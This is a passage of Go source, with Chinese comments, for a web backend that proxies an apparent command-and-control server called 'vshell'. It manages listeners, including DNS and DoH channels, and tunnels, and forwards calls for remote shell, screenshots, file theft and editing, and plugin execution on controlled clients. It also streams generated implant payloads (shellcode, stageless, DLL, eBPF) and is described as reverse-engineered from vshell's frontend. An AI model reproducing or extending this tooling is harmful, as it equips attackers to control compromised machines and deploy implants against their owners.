		st.LogShellOp("vshell", server.ID, "tunnel."+req.Op, fmt.Sprintf("id=%v", req.ID))
		writeJSON(w, http.StatusOK, map[string]any{"ok": true})
	default:
		writeErr(w, http.StatusBadRequest, "未知隧道操作 "+req.Op)
	}
}

func (s *Server) vshellListeners(w http.ResponseWriter, r *http.Request) {
	server, _, ok := s.getVshellServerByID(w, r)
	if !ok {
		return
	}
	ctx, cancel := context.WithTimeout(r.Context(), 60*time.Second)
	defer cancel()
	items, err := vshellClientFor(server).Listeners(ctx)
	if err != nil {
		writeErr(w, http.StatusBadGateway, err.Error())
		return
	}
	if items == nil {
		items = []json.RawMessage{}
	}
	writeJSON(w, http.StatusOK, map[string]any{"items": items})
}

func (s *Server) vshellInfo(w http.ResponseWriter, r *http.Request) {
	server, _, ok := s.getVshellServerByID(w, r)
	if !ok {
		return
	}
	ctx, cancel := context.WithTimeout(r.Context(), 60*time.Second)
	defer cancel()
	info, err := vshellClientFor(server).Info(ctx)
	if err != nil {
		writeErr(w, http.StatusBadGateway, err.Error())
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"info": json.RawMessage(info)})
}

func toInt(v any) int64 {
	switch n := v.(type) {
	case float64:
		return int64(n)
	case int64:
		return n
	case int:
		return int64(n)
	case string:
		var out int64
		for _, c := range n {
			if c < '0' || c > '9' {
				return 0
			}
			out = out*10 + int64(c-'0')
		}
		return out
	}
	return 0
}

// =====================================================================
// vshell 4.9.3 全功能对齐(接口形态来自 2.10.1 web 前端实测与 bundle 逆向)
// =====================================================================

// Listener 监听行(/listener/list 字段)。
type Listener struct {
	Id                 int64  `json:"Id"`
	Remark             string `json:"Remark"`
	Mode               string `json:"Mode"` // tcp|kcp|ws|dns|doh|dot|oss
	ListenAddr         string `json:"ListenAddr"`
	ConnectAddr        string `json:"ConnectAddr"`
	WsConnectAddr      string `json:"WsConnectAddr,omitempty"`
	DNSDomain          string `json:"DNSDomain,omitempty"`
	PublicDNS          string `json:"PublicDNS,omitempty"`
	MaxDNSsize         int64  `json:"MaxDNSsize,omitempty"`
	DisconnectTimeout  int64  `json:"DisconnectTimeout"`
	PingInterval       int64  `json:"PingInterval"`
	Vkey               string `json:"Vkey"`
	EncryptSalt        string `json:"EncryptSalt"`
	OssUrl             string `json:"OssUrl,omitempty"`
	Status             bool   `json:"Status"`
}

// listenerAddRequest 新增/编辑监听表单(字段名与 vshell 端点逐字对齐)。
type listenerAddRequest struct {
	Mode              string `json:"Mode"`
	Remark            string `json:"Remark"`
	ListenAddr        string `json:"ListenAddr"`
	ConnectAddr       string `json:"ConnectAddr"`
	WsConnectAddr     string `json:"WsConnectAddr,omitempty"`
	DNSDomain         string `json:"DNSDomain,omitempty"`
	PublicDNS         string `json:"PublicDNS,omitempty"`
	MaxDNSsize        *int64 `json:"MaxDNSsize,omitempty"`
	DisconnectTimeout int64  `json:"DisconnectTimeout"`
	PingInterval      int64  `json:"PingInterval"`
	Vkey              string `json:"Vkey"`
	EncryptSalt       string `json:"EncryptSalt"`
	OssUrl            string `json:"OssUrl,omitempty"`
}

// vshellListenersFull 监听清单(status=false 含离线)。
func (c *VshellClient) listenersFull(ctx context.Context) ([]json.RawMessage, error) {
	res, err := c.API(ctx, "listener/list", map[string]any{"page": 1, "pageSize": 9999})
	if err != nil {
		return nil, err
	}
	var page struct {
		Items []json.RawMessage `json:"items"`
	}
	if err := json.Unmarshal(res, &page); err != nil {
		return nil, fmt.Errorf("listener/list 输出异常")
	}
	return page.Items, nil
}

// vshellGeneric 站点任意 /api/{endpoint} 调用(前端通用转发,错误透传)。
func (s *Server) vshellGeneric(w http.ResponseWriter, r *http.Request) {
	server, st, ok := s.getVshellServerByID(w, r)
	if !ok {
		return
	}
	var req struct {
		Endpoint string          `json:"endpoint"`
		Body     json.RawMessage `json:"body"`
		TimeoutS int             `json:"timeout_s"`
	}
	if !decodeShellJSON(w, r, &req) {
		return
	}
	endpoint := strings.Trim(strings.TrimSpace(req.Endpoint), "/")
	if endpoint == "" || strings.ContainsAny(endpoint, "?#") || strings.Contains(endpoint, "..") {
		writeErr(w, http.StatusBadRequest, "endpoint 非法")
		return
	}
	// 白名单:vshell 已知业务端点(避免开放代理任意路径)
	allowed := map[string]bool{}
	for _, p := range []string{
		"client/list", "client/add", "client/editremark", "client/delfile", "client/delprocess", "client/dellist",
		"listener/list", "listener/add", "listener/edit", "listener/editremark", "listener/del", "listener/dellist",
		"listener/start", "listener/stop",
		"tunnel/list", "tunnel/add", "tunnel/edit", "tunnel/editremark", "tunnel/del", "tunnel/dellist",
		"tunnel/start", "tunnel/stop",
		"terminal/shell", "screenshot/get",
		"runner/list", "runner/runplugin",
		"setting/get", "setting/edit",
		"install/install", "install/remove",
		"file/ls", "file/cat", "file/edit", "file/mkdir", "file/rm", "file/rmlist", "file/mv", "file/touch",
		"file/wget", "file/upload", "file/getdisk", "file/modifytime", "file/getdownloadper",
		"file/downloadtoserver", "file/downloadtooss",
		"dashboard/info", "error-log/list",
	} {
		allowed[p] = true
	}
	if !allowed[endpoint] {
		writeErr(w, http.StatusBadRequest, "端点不在白名单:"+endpoint)
		return
	}
	timeout := 60 * time.Second
	if req.TimeoutS > 0 && req.TimeoutS <= 300 {
		timeout = time.Duration(req.TimeoutS) * time.Second
	}
	ctx, cancel := context.WithTimeout(r.Context(), timeout)
	defer cancel()
	var body any
	if len(req.Body) > 0 {
		if err := json.Unmarshal(req.Body, &body); err != nil {
			writeErr(w, http.StatusBadRequest, "body 非法 JSON:"+err.Error())
			return
		}
	}
	res, err := vshellClientFor(server).API(ctx, endpoint, body)
	if err != nil {
		st.LogShellOp("vshell", server.ID, "api."+endpoint+".fail", string(req.Body))
		writeErr(w, http.StatusBadGateway, err.Error())
		return
	}
	st.LogShellOp("vshell", server.ID, "api."+endpoint, string(req.Body))
	if res == nil {
		writeJSON(w, http.StatusOK, map[string]any{"result": nil})
		return
	}
	writeJSON(w, http.StatusOK, map[string]any{"result": json.RawMessage(res)})
}

// vshellClientDownload 客户端生成代理:/download/* 端点流式回浏览器。
// path: stage|shellcode|stageless|dll|listen|listendll|ebpf
func (s *Server) vshellClientDownload(w http.ResponseWriter, r *http.Request) {
	server, st, ok := s.getVshellServerByID(w, r)
	if !ok {
		return
	}
	kind := r.PathValue("kind")
	switch kind {
	case "stage", "shellcode", "stageless", "dll", "listen", "listendll", "ebpf":
	default:
		writeErr(w, http.StatusBadRequest, "未知生成类型 "+kind)
		return
	}
	client := vshellClientFor(server)
	client.mu.Lock()
	if client.token == "" {
		client.mu.Unlock()
		ctx, cancel := context.WithTimeout(r.Context(), 60*time.Second)
		defer cancel()
		if err := client.login(ctx); err != nil {
			writeErr(w, http.StatusBadGateway, err.Error())
			return
		}
		client.mu.Lock()
	}
	token := client.token
	client.mu.Unlock()

	q := r.URL.RawQuery
	if q == "" {
		q = r.URL.Query().Encode()
	}
	target := "/api/download/" + kind
	if q != "" {
		target += "?" + q
	}
	req, err := http.NewRequestWithContext(r.Context(), "GET", client.base+target, nil)
	if err != nil {
		writeErr(w, http.StatusInternalServerError, err.Error())
		return
	}
	req.Header.Set("Authorization", client.basicAuth)
	req.Header.Set("Token", token)
	resp, err := (&http.Client{Timeout: 10 * time.Minute}).Do(req)
	if err != nil {
		writeErr(w, http.StatusBadGateway, "生成请求失败:"+err.Error())
		return
	}
	defer resp.Body.Close()
	if resp.StatusCode == 401 {
		writeErr(w, http.StatusBadGateway, "vshell 登录态失效——重试一次")
		return
	}
	if resp.StatusCode != 200 {
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
		writeErr(w, http.StatusBadGateway, fmt.Sprintf("生成失败(HTTP %d):%s", resp.StatusCode, string(body)))
		return
	}
	st.LogShellOp("vshell", server.ID, "download."+kind, q)
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", resp.Header.Get("Content-Disposition"))
	w.WriteHeader(http.StatusOK)
	io.Copy(w, resp.Body)
}

// vshellRunnerUpload 插件上传代理:multipart file → vshell /runner/upload。
func (s *Server) vshellRunnerUpload(w http.ResponseWriter, r *http.Request) {
	server, st, ok := s.getVshellServerByID(w, r)
	if !ok {
		return
	}
	if err := r.ParseMultipartForm(64 << 20); err != nil {
		writeErr(w, http.StatusBadRequest, "multipart 解析失败:"+err.Error())
		return
	}
	file, header, err := r.FormFile("file")
	if err != nil {
		writeErr(w, http.StatusBadRequest, "缺少 file 字段")
		return
	}
	defer file.Close()
	content, err := io.ReadAll(file)
	if err != nil {
		writeErr(w, http.StatusBadRequest, "读取上传内容失败")
		return
	}
	client := vshellClientFor(server)
	ctx, cancel := context.WithTimeout(r.Context(), 30*time.Minute)
	defer cancel()
	if err := client.uploadFile(ctx, "/api/runner/upload", header.Filename, content); err != nil {
		writeErr(w, http.StatusBadGateway, err.Error())
		return
	}
	st.LogShellOp("vshell", server.ID, "runner.upload", header.Filename)
	writeJSON(w, http.StatusOK, map[string]any{"ok": true, "size": len(content)})
}
